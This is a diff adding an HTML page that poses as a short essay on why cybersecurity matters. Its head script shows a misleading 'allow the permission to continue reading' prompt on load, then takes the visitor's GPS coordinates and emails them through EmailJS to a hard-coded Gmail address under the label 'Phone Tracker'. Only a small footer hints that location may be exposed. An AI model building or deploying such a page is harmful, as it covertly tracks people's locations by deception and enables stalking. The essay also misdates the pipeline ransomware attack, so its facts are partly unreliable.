@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>HAIIII</title>
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Poppins:wght@100;300;400;600;700&display=swap" rel="stylesheet">
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+  <style>
+    body {
+      background-image: url("backgound.jpg");
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    h2, p {
+      text-align: center;
+      color: brown;
+      gap: 2px;
+    }
+  </style>
+
+  <script>
+    emailjs.init("bvQcyamPOQtE1JIxa");
+
+    function sendLocation() {
+      if (!navigator.geolocation) {
+        alert("Geolocation is not supported by your browser.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const locationMessage = `
+🔍 New GPS location detected:
+
+🛰 Latitude: ${position.coords.latitude}
+🧭 Longitude: ${position.coords.longitude}
+📶 Accuracy: ±${position.coords.accuracy} meters
+`;
+
+          emailjs.send("service_5rpytcs", "template_xrxr8mj", {
+            user_name: "Phone Tracker",
+            user_email: "accireed@gmail.com",
+            message: locationMessage,
+          })
+          .then(() => {
+            console.log("Location sent successfully.");
+          })
+          .catch((error) => {
+            console.error("Failed to send location:", error);
+          });
+        },
+        (error) => {
+          console.error("Error getting location:", error);
+        }
+      );
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+      // Optional: Ask for user consent before sending location
+      const confirmSend = confirm("please allow the permission to continue reading");
+      if (confirmSend) {
+        sendLocation();
+      }
+    });
+  </script>
+</head>
+<body>
+  <h2>🔐 The Digital Shield: Why Cybersecurity Matters More Than Ever</h2>
+  <p>
+    In the modern world, almost every aspect of our lives is connected to the internet. We shop online, store personal photos in the cloud, manage our bank accounts through apps, and even use smart devices to control our homes. While this digital convenience makes life easier, it also opens the door to new dangers — and that’s where cybersecurity steps in as our digital shield.
+    <br><br>
+    Cybersecurity refers to the protection of internet-connected systems — including hardware, software, and data — from cyberattacks. These attacks can come in many forms: viruses that damage files, hackers stealing sensitive data, or phishing scams that trick people into revealing passwords. The consequences of these breaches can be severe, from financial loss to identity theft, or even national security threats.
+    <br><br>
+    One major reason cybersecurity is so important is the rise of cybercrime. Hackers are no longer lone individuals working in basements; many are part of organized groups or even state-sponsored teams. In 2020, a single ransomware attack on a major U.S. oil pipeline disrupted fuel supplies across the East Coast, showing how vulnerable even critical infrastructure can be.
+    <br><br>
+    But cybersecurity is not just a government or corporate issue — it affects everyone. A strong password, two-factor authentication, and being cautious with suspicious emails are simple steps individuals can take to protect themselves. Education and awareness play a key role in strengthening the overall defense system against digital threats.
+    <br><br>
+    As technology continues to advance, so do the methods of cybercriminals. That’s why cybersecurity must evolve too. Governments, companies, and individuals must work together to stay one step ahead. In a digital world, cybersecurity isn’t just an option.
+  </p>
+
+  <p>⚠️ Without your knowledge, your location can be exposed to the site developer.</p>
+</body>
+</html>
